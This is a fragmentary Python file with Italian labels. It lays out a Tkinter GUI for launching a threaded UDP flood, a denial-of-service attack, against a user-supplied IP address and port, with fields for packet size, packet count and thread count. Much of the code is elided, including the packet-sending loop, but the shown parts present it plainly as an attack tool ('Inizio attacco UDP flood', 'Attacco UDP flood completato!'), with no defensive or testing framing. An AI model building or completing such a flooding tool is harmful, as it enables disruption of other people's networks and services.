...
# Funzione per eseguire un UDP Flood con conteggio pacchetti e threading
def udp_flood(target_ip, target_port, packet_size, packet_count, thread_count):
    ...
    def flood(thread_id):
        ...
        try:
            ...
            print(f"Errore nel thread {thread_id} di flood: {e}")

    print(f"Inizio attacco UDP flood su {target_ip}:{target_port} con {thread_count} thread e {packet_count} pacchetti")
    threads = []
...
def start_udp_flood():
    ...
    if not target_ip or not target_port or not packet_size or not packet_count or not thread_count:
    ...
    try:
        ...
        udp_flood(target_ip, target_port, packet_size, packet_count, thread_count)
        messagebox.showinfo("Successo", "Attacco UDP flood completato!")
    except ValueError:
        messagebox.showerror("Errore", "Porta, dimensione pacchetti, numero pacchetti e numero thread devono essere numeri interi!")
    except Exception as e:
...
def create_gui():
    global ip_entry, port_entry, size_entry, count_entry, thread_entry, selected_port_entry, port_output
    ...
    tk.Label(root, text="Numero di Thread:").grid(row=10, column=0, padx=10, pady=5, sticky="e")
    thread_entry = tk.Entry(root, width=30)
    thread_entry.grid(row=10, column=1, padx=10, pady=5)

    tk.Button(root, text="Avvia UDP Flood", command=start_udp_flood).grid(row=11, column=0, columnspan=2, pady=10)
